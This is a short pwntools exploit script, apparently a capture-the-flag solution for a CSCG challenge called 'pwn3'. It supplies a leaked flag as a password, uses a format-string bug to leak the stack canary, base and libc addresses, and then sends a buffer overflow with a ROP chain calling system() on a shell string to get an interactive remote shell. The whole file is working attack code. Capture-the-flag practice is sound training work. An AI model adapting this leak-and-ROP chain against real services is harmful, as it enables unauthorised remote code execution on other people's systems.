from pwn import *

#p = process("./pwn3/pwn3")
p = remote("hax1.allesctf.net", 9102)

#second_psswd = "CSCG{THIS_IS_TEST_FLAG}"
second_psswd = "CSCG{NOW_GET_VOLDEMORT}"

p.recvuntil("Enter the password of stage 2:")
p.sendline(second_psswd)

format_string = "%41$p " + "%p " * 50

p.recvuntil("Enter your witch name:")
print("Sending format string...")
p.sendline(format_string)

format_result = p.recvuntil("enter your magic spell")
stack = (format_result.split())[8:-4]


print("STACK:")
print(stack)

main_after_welcome = int(stack[0], 16) # %41$p
base_addr = main_after_welcome - 0xd7e



#cyclic_pattern = cyclic(0xff + 0x1f)

padding1 = "A" * 251

system_addr = int(stack[-6], 16) + 0x2e2fd
print("system function at: " + str(hex(system_addr)))

shell_string = int(stack[-6], 16) + 0x18f430
print("shell string at: " + str(hex(shell_string)))

rop_gadget = base_addr + 0x0000000000000df3
print("rop gadget at: " + str(hex(rop_gadget)))

rbp = int(stack[-11], 16)
print("rbp is: " + str(hex(rbp)))

cannary = int(stack[-12], 16)
print("cannary is: " + str(hex(cannary)))

return_gadget = main_after_welcome + 0xc
print("return gadget at: " + str(hex(return_gadget)))
#padding2 = "A" * ((259 - 251) - 4 - 4)


raw_input("Attach gdb")
print("Sending bufferoverflow")

p.sendline("Expelliarmus\x00" + padding1 + p64(cannary) + p64(rbp) + p64(rop_gadget)
    + p64(shell_string) + p64(return_gadget) + p64(system_addr))

p.interactive()
